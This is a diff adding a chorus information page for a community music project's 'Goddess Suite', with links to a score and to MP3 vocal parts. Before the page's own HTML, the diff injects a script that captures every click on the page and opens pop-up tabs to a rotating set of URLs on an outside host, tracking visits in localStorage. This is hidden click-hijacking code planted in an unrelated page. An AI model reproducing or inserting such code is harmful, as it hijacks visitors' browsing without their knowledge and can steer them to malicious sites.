@@ -1,0 +1,200 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<html>
+  <head>
+    <meta HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=utf-8">
+    <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
+    <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
+    <title>The Community Music Project: The Goddess Suite</title>
+    <link href="cmp.css" rel="stylesheet" type="text/css">
+    <style type="text/css">
+      h3 {
+        text-align: center;
+      }
+
+      #content {
+        width: 640px;
+      }
+
+      #parts {
+        border: 1px solid black;
+      }
+      #parts td {
+        border: 1px solid silver;
+        padding: 0.25em 0.5em;
+      }
+      
+    </style>
+  </head>
+  <body>
+    <iframe id="nav" src="nav.html"></iframe>
+
+    <h2>The Goddess Suite: Information for the Chorus</h2>
+
+    <div id="content">
+
+      <h3>The Score</h3>
+      <p>
+        <a href="albums/tgs/tgs-score.pdf">Download a copy of the score here</a>; it's
+        about 6.5 megabytes, so it might take some time.
+        This is a PDF file, and you will need PDF viewing software to read or print it.
+        If you can't open the file once it's downloaded,
+        <a href="http://get.adobe.com/reader/">click here to download Adobe Reader.</a>
+      </p>
+  
+      <h3>Individual Vocal Parts</h3>
+      <p>
+        We have recorded each vocal part for you to listen to and sing along with.
+        More will be made available as we record them.
+        They are in MP3 format, and should be playable on your computer or on any
+        portable music player. You can also burn them onto an audio CD.
+        The links that say "Marked Score" are PDF files containing a reference score with
+        each part highlighted in a different color and the measures numbered.
+        <hr/>
+        <b>Instructions:</b>
+        <ol>
+          <li>Find the column for your part in the table below.</li>
+          <li>Right click a link for that part and select "Save Link As..." or "Save Target As..." from the menu.</li>
+          <li>Select a location on your computer to save the file.</li>
+          <li>When the mp3 file is finished downloading, open it with a media player such as iTunes or Windows Media Player.</li>
+          <li>You can also start your CD burning software, choose to create an Audio CD, and drag the mp3 files onto it.</li>
+        </ol>
+        <br/>
+        <table id="parts">
+          <tr>
+            <td><b>Artemis</b></td>
+            <td><a href="albums/tgs/TGS-01-Artemis.mp3">All Parts</a></td>
+            <td><a href="albums/tgs/parts/Artemis-1st-Soprano.mp3">1st Soprano</a></td>
+            <td><a href="albums/tgs/parts/Artemis-2nd-Soprano.mp3">2nd Soprano</a></td>
+            <td><a href="albums/tgs/parts/Artemis-1st-Alto.mp3">1st Alto</a></td>
+            <td><a href="albums/tgs/parts/Artemis-2nd-Alto.mp3">2nd Alto</a></td>
+            <td><a href="albums/tgs/parts/Artemis-score.pdf">Marked Score</a></td>
+          </tr>
+          <tr>
+            <td><b>Demeter &amp; Persephone</b></td>
+            <td><a href="albums/tgs/TGS-02-Demeter-and-Persephone.mp3">All Parts</a></td>
+            <td><a href="albums/tgs/parts/DemeterPersephone-1st-Soprano.mp3">1st Soprano</a></td>
+            <td><a href="albums/tgs/parts/DemeterPersephone-2nd-Soprano.mp3">2nd Soprano</a></td>
+            <td><a href="albums/tgs/parts/DemeterPersephone-1st-Alto.mp3">1st Alto</a></td>
+            <td><a href="albums/tgs/parts/DemeterPersephone-2nd-Alto.mp3">2nd Alto</a></td>
+            <td><a href="albums/tgs/parts/DemeterPersephone-score.pdf">Marked Score</a></td>
+          </tr>
+          <tr>
+            <td><b>Hymn to Hera</b></td>
+            <td><a href="albums/tgs/TGS-03-Hymn-to-Hera.mp3">All Parts</a></td>
+            <td><a href="albums/tgs/parts/Hera-1st-Soprano.mp3">1st Soprano</a></td>
+            <td><a href="albums/tgs/parts/Hera-2nd-Soprano.mp3">2nd Soprano</a></td>
+            <td><a href="albums/tgs/parts/Hera-1st-Alto.mp3">1st Alto</a></td>
+            <td><a href="albums/tgs/parts/Hera-2nd-Alto.mp3">2nd Alto</a></td>
+            <td><a href="albums/tgs/parts/Hera-score.pdf">Marked Score</a></td>
+          </tr>
+          <tr>
+            <td><b>Hestia</b></td>
+            <td><a href="albums/tgs/TGS-04-Hestia.mp3">All Parts</a></td>
+            <td><a href="albums/tgs/parts/Hestia-1st-Soprano.mp3">1st Soprano</a></td>
+            <td><a href="albums/tgs/parts/Hestia-2nd-Soprano.mp3">2nd Soprano</a></td>
+            <td><a href="albums/tgs/parts/Hestia-1st-Alto.mp3">1st Alto</a></td>
+            <td><a href="albums/tgs/parts/Hestia-2nd-Alto.mp3">2nd Alto</a></td>
+            <td><a href="albums/tgs/parts/Hestia-score.pdf">Marked Score</a></td>
+          </tr>
+          <tr>
+            <td><b>Aphrodite</b></td>
+            <td><a href="albums/tgs/TGS-05-Aphrodite.mp3">All Parts</a></td>
+            <td><a href="albums/tgs/parts/Aphrodite-1st-Soprano.mp3">1st Soprano</a></td>
+            <td><a href="albums/tgs/parts/Aphrodite-2nd-Soprano.mp3">2nd Soprano</a></td>
+            <td><a href="albums/tgs/parts/Aphrodite-1st-Alto.mp3">1st Alto</a></td>
+            <td><a href="albums/tgs/parts/Aphrodite-2nd-Alto.mp3">2nd Alto</a></td>
+            <td><a href="albums/tgs/parts/Aphrodite-score.pdf">Marked Score</a></td>
+          </tr>
+          <tr>
+            <td><b>Athena</b></td>
+            <td><a href="albums/tgs/TGS-06-Athena.mp3">All Parts</a></td>
+            <td><a href="albums/tgs/parts/Athena-1st-Soprano.mp3">1st Soprano</a></td>
+            <td><a href="albums/tgs/parts/Athena-2nd-Soprano.mp3">2nd Soprano</a></td>
+            <td><a href="albums/tgs/parts/Athena-1st-Alto.mp3">1st Alto</a></td>
+            <td><a href="albums/tgs/parts/Athena-2nd-Alto.mp3">2nd Alto</a></td>
+            <td><a href="albums/tgs/parts/Athena-score.pdf">Marked Score</a></td>
+          </tr>
+        </table>
+      </p>
+
+    </div>
+
+  </body>
+</html>
